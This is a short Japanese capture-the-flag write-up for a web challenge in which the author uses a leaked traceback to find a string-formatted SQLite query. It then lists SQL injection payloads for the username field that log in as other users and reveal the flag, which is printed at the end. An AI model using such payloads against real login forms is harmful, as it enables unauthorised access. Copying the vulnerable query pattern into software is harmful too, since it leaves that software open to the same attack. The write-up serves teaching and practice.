# Baiting:Web:200pts
Challenge instance ready at 95.216.233.106:12952.  
That user list had a user called loginToGetFlag. Well, what are you waiting for?  

# Solution
アクセスするとログインフォームが見える。  
Login  
[site.png](../Entrypoint/site/site.png)  
ソースコードからは何も得られないのでログインを試す。  
`'`を入力すると以下のようなエラーが出た。  
```python
Traceback (most recent call last):
  File "/srv/raro/main.py", line 132, in index
    cur.execute("SELECT algo FROM users WHERE username='{}'".format(
sqlite3.OperationalError: unrecognized token: "'''"
```
usernameでSQLインジェクションを試みる。  
まずは基本である`' OR 't'='t`である。  
Welcome, xxslayer420  
[site1.png](../Admin_Attack/site/site.png)  
ではこれ以外のユーザーでのログインを試みる。  
ユーザー名がxxslayer420以外を指定する`' OR username!='xxslayer420`である。  
Welcome, jimmyTehAdmin  
[site2.png](../Admin_Attack/site/flag.png)  
さらにNGを追加していく。  
`' OR (username!='xxslayer420' AND username!='jimmyTehAdmin') --`
flag(Welcome, loginToGetFlag)  
[flag.png](site/flag.png)  
flagが出てきた。  

## ractf{injectingSQLLikeNobody'sBusiness}